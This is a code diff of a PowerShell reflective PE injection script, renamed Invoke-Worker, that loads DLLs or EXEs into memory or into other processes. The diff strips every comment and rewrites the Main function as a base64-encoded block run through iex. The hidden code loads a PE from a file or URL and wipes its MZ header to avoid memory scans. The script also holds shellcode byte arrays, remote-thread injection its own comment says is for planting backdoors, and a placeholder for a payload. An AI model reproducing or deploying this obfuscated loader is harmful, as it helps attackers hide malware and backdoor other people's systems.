@@ -2211,7 +2031,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				$RemoteLoading = $true
 			}
 
-			#Get basic PE information
+			
 			Write-Verbose "Getting basic PE information from the file"
 			$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
 			$OriginalImageBase = $PEInfo.OriginalImageBase
@@ -2222,7 +2042,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			}
 
 
-			#Verify that the PE and the current process are the same bits (32bit or 64bit)
+			
 			$Process64Bit = $true
 			if ($RemoteLoading -eq $true) {
 				$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
@@ -2241,7 +2061,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 					$Process64Bit = $false
 				}
 
-				#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
+				
 				$PowerShell64Bit = $true
 				if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
 					$PowerShell64Bit = $false
@@ -2260,10 +2080,10 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			}
 
 
-			#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
+			
 			Write-Verbose "Allocating memory for the PE and write its headers to memory"
 
-			#ASLR check
+			
 			[IntPtr]$LoadAddr = [IntPtr]::Zero
 			$PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
 			if ((-not $ForceASLR) -and (-not $PESupportsASLR)) {
@@ -2281,13 +2101,13 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
 			}
 
-			$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
-			$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
+			$PEHandle = [IntPtr]::Zero				
+			$EffectivePEHandle = [IntPtr]::Zero		
 			if ($RemoteLoading -eq $true) {
-				#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
+				
 				$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 
-				#todo, error handling needs to delete this memory if an error happens along the way
+				
 				$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
 				if ($EffectivePEHandle -eq [IntPtr]::Zero) {
 					Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
@@ -2310,7 +2130,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
 
 
-			#Now that the PE is in memory, get more detailed information about it
+			
 			Write-Verbose "Getting detailed PE information from the headers loaded in memory"
 			$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 			$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
@@ -2318,17 +2138,17 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
 
 
-			#Copy each section from the PE in to memory
+			
 			Write-Verbose "Copy PE sections in to memory"
 			Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
 
 
-			#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
+			
 			Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
 			Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types
 
 
-			#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
+			
 			Write-Verbose "Import DLL's needed by the PE we are loading"
 			if ($RemoteLoading -eq $true) {
 				Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
@@ -2338,7 +2158,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			}
 
 
-			#Update the memory protection flags for all the memory just allocated
+			
 			if ($RemoteLoading -eq $false) {
 				if ($NXCompatible -eq $true) {
 					Write-Verbose "Update memory protection flags"
@@ -2353,7 +2173,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			}
 
 
-			#If remote loading, copy the DLL in to remote process memory
+			
 			if ($RemoteLoading -eq $true) {
 				[UInt32]$NumBytesWritten = 0
 				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
@@ -2363,7 +2183,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			}
 
 
-			#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
+			
 			if ($PEInfo.FileType -ieq "DLL") {
 				if ($RemoteLoading -eq $false) {
 					Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
@@ -2377,13 +2197,13 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 					$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 
 					if ($PEInfo.PE64Bit -eq $true) {
-						#Shellcode: CallDllMain.asm
+						
 						$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
 						$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
 						$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
 					}
 					else {
-						#Shellcode: CallDllMain.asm
+						
 						$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
 						$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
 						$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
@@ -2423,13 +2243,13 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				}
 			}
 			elseif ($PEInfo.FileType -ieq "EXE") {
-				#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
+				
 				[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
 				[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
 				$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr
 
-				#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
-				#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
+				
+				
 				[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 				Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."
 
@@ -2459,21 +2279,21 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				$PEHandle
 			)
 
-			#Get Win32 constants and functions
+			
 			$Win32Constants = Get-Win32Constants
 			$Win32Functions = Get-Win32Functions
 			$Win32Types = Get-Win32Types
 
 			$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 
-			#Call FreeLibrary for all the imports of the DLL
+			
 			if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0) {
 				[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
 
 				while ($true) {
 					$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
 
-					#If the structure is null, it signals that this is the end of the array
+					
 					if ($ImportDescriptor.Characteristics -eq 0 `
 							-and $ImportDescriptor.FirstThunk -eq 0 `
 							-and $ImportDescriptor.ForwarderChain -eq 0 `
@@ -2499,7 +2319,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				}
 			}
 
-			#Call DllMain with process detach
+			
 			Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
 			$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 			$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
@@ -2522,7 +2342,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 
 			$RemoteProcHandle = [IntPtr]::Zero
 
-			#If a remote process to inject in to is specified, get a handle to it
+			
 			if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne "")) {
 				Throw "Can't supply a ProcId and ProcName, choose one or the other"
 			}
@@ -2541,13 +2361,13 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				}
 			}
 
-			#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
-			#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
-			#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
-			#		{
-			#			Write-Verbose "Getting SeDebugPrivilege"
-			#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
-			#		}
+			
+			
+			
+			
+			
+			
+			
 
 			if (($ProcId -ne $null) -and ($ProcId -ne 0)) {
 				$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
@@ -2559,7 +2379,7 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			}
 
 
-			#Load the PE reflectively
+			
 			Write-Verbose "Calling Invoke-MemoryLoadLibrary"
 			$PEHandle = [IntPtr]::Zero
 			if ($RemoteProcHandle -eq [IntPtr]::Zero) {
@@ -2573,15 +2393,15 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 			}
 
 			$PEHandle = $PELoadedInfo[0]
-			$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
+			$RemotePEHandle = $PELoadedInfo[1] 
 
 
-			#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
+			
 			$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 			if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero)) {
-				#########################################
-				### YOUR CODE GOES HERE
-				#########################################
+				
+				
+				
 				switch ($FuncReturnType) {
 					'WString' {
 						Write-Verbose "Calling function with WString return type"
@@ -2620,11 +2440,11 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 						$VoidFunc.Invoke() | Out-Null
 					}
 				}
-				#########################################
-				### END OF YOUR CODE
-				#########################################
+				
+				
+				
 			}
-			#For remote DLL injection, call a void function which takes no parameters
+			
 			elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero)) {
 				$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "run"
 				if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero)) {
@@ -2634,17 +2454,17 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 				$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
 				$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
 
-				#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
+				
 				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
 			}
 
-			#Don't free a library if it is injected in a remote process or if it is an EXE.
-			#Note that all DLL's loaded by the EXE will remain loaded in memory.
+			
+			
 			if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL") {
 				Invoke-MemoryFreeLibrary -PEHandle $PEHandle
 			}
 			else {
-				#Delete the PE file from memory.
+				
 				$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
 				if ($Success -eq $false) {
 					Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
@@ -2657,49 +2477,14 @@ Blog on using this script as a backdoor with SQL server: http://www.casaba.com/b
 		Main
 	}
 
-	#Main function to either run the script locally or remotely
+	
 	Function Main {
-		if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent) {
-			$DebugPreference = "Continue"
-		}
-
-		Write-Verbose "PowerShell ProcessID: $PID"
-
-		if ($PsCmdlet.ParameterSetName -ieq "LocalFile") {
-			Get-ChildItem $PEPath -ErrorAction Stop | Out-Null
-			[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
-		}
-		elseif ($PsCmdlet.ParameterSetName -ieq "WebFile") {
-			$WebClient = New-Object System.Net.WebClient
-
-			[Byte[]]$PEBytes = $WebClient.DownloadData($PEUrl)
-		}
-
-		#Verify the image is a valid PE file
-		$e_magic = ($PEBytes[0..1] | % { [Char] $_ }) -join ''
-
-		if ($e_magic -ne 'MZ') {
-			throw 'PE is not a valid PE file.'
-		}
-
-		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
-		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
-		$PEBytes[0] = 0
-		$PEBytes[1] = 0
-
-		#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
-		if ($ExeArgs -ne $null -and $ExeArgs -ne '') {
-			$ExeArgs = "ReflectiveExe $ExeArgs"
-		}
-		else {
-			$ExeArgs = "ReflectiveExe"
-		}
-        
-		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName, $ForceASLR)
+		$code = [Convert]::FromBase64String("aQBmACAAKAAoACQAUABTAEMAbQBkAGwAZQB0AC4ATQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4ALgBCAG8AdQBuAGQAUABhAHIAYQBtAGUAdABlAHIAcwBbACIARABlAGIAdQBnACIAXQAgAC0AbgBlACAAJABuAHUAbABsACkAIAAtAGEAbgBkACAAJABQAFMAQwBtAGQAbABlAHQALgBNAHkASQBuAHYAbwBjAGEAdABpAG8AbgAuAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAFsAIgBEAGUAYgB1AGcAIgBdAC4ASQBzAFAAcgBlAHMAZQBuAHQAKQAgAHsACgAJAAkACQAkAEQAZQBiAHUAZwBQAHIAZQBmAGUAcgBlAG4AYwBlACAAPQAgACIAQwBvAG4AdABpAG4AdQBlACIACgAJAAkAfQAKAAoACQAJAFcAcgBpAHQAZQAtAFYAZQByAGIAbwBzAGUAIAAiAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABQAHIAbwBjAGUAcwBzAEkARAA6ACAAJABQAEkARAAiAAoACgAJAAkAaQBmACAAKAAkAFAAcwBDAG0AZABsAGUAdAAuAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAIAAtAGkAZQBxACAAIgBMAG8AYwBhAGwARgBpAGwAZQAiACkAIAB7AAoACQAJAAkARwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgACQAUABFAFAAYQB0AGgAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAB8ACAATwB1AHQALQBOAHUAbABsAAoACQAJAAkAWwBCAHkAdABlAFsAXQBdACQAUABFAEIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEEAbABsAEIAeQB0AGUAcwAoACgAUgBlAHMAbwBsAHYAZQAtAFAAYQB0AGgAIAAkAFAARQBQAGEAdABoACkAKQAKAAkACQB9AAoACQAJAGUAbABzAGUAaQBmACAAKAAkAFAAcwBDAG0AZABsAGUAdAAuAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAIAAtAGkAZQBxACAAIgBXAGUAYgBGAGkAbABlACIAKQAgAHsACgAJAAkACQAkAFcAZQBiAEMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQACgAKAAkACQAJAFsAQgB5AHQAZQBbAF0AXQAkAFAARQBCAHkAdABlAHMAIAA9ACAAJABXAGUAYgBDAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABQAEUAVQByAGwAKQAKAAkACQB9AAoACgAJAAkACgAJAAkAJABlAF8AbQBhAGcAaQBjACAAPQAgACgAJABQAEUAQgB5AHQAZQBzAFsAMAAuAC4AMQBdACAAfAAgACUAIAB7ACAAWwBDAGgAYQByAF0AIAAkAF8AIAB9ACkAIAAtAGoAbwBpAG4AIAAnACcACgAKAAkACQBpAGYAIAAoACQAZQBfAG0AYQBnAGkAYwAgAC0AbgBlACAAJwBNAFoAJwApACAAewAKAAkACQAJAHQAaAByAG8AdwAgACcAUABFACAAaQBzACAAbgBvAHQAIABhACAAdgBhAGwAaQBkACAAUABFACAAZgBpAGwAZQAuACcACgAJAAkAfQAKAAoACQAJAAoACQAJAAoACQAJACQAUABFAEIAeQB0AGUAcwBbADAAXQAgAD0AIAAwAAoACQAJACQAUABFAEIAeQB0AGUAcwBbADEAXQAgAD0AIAAwAAoACgAJAAkACgAJAAkAaQBmACAAKAAkAEUAeABlAEEAcgBnAHMAIAAtAG4AZQAgACQAbgB1AGwAbAAgAC0AYQBuAGQAIAAkAEUAeABlAEEAcgBnAHMAIAAtAG4AZQAgACcAJwApACAAewAKAAkACQAJACQARQB4AGUAQQByAGcAcwAgAD0AIAAiAFIAZQBmAGwAZQBjAHQAaQB2AGUARQB4AGUAIAAkAEUAeABlAEEAcgBnAHMAIgAKAAkACQB9AAoACQAJAGUAbABzAGUAIAB7AAoACQAJAAkAJABFAHgAZQBBAHIAZwBzACAAPQAgACIAUgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQAiAAoACQAJAH0ACgAgACAAIAAgACAAIAAgACAACgAJAAkASQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAAkAFIAZQBtAG8AdABlAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABAACgAJABQAEUAQgB5AHQAZQBzACwAIAAkAEYAdQBuAGMAUgBlAHQAdQByAG4AVAB5AHAAZQAsACAAJABQAHIAbwBjAEkAZAAsACAAJABQAHIAbwBjAE4AYQBtAGUALAAgACQARgBvAHIAYwBlAEEAUwBMAFIAKQA=")
+		[Text.Encoding]::Unicode.GetString($code) | iex
 	}
 
 	Main
 }
 
 $bytes = [Convert]::FromBase64String("INSERT_HERE")
-Invoke-Worker -PEBytes $bytes -FuncReturnType "Void" -Verbose -FuncName "run"
+Invoke-Worker -PEBytes $bytes -FuncReturnType "Void" -FuncName "run"
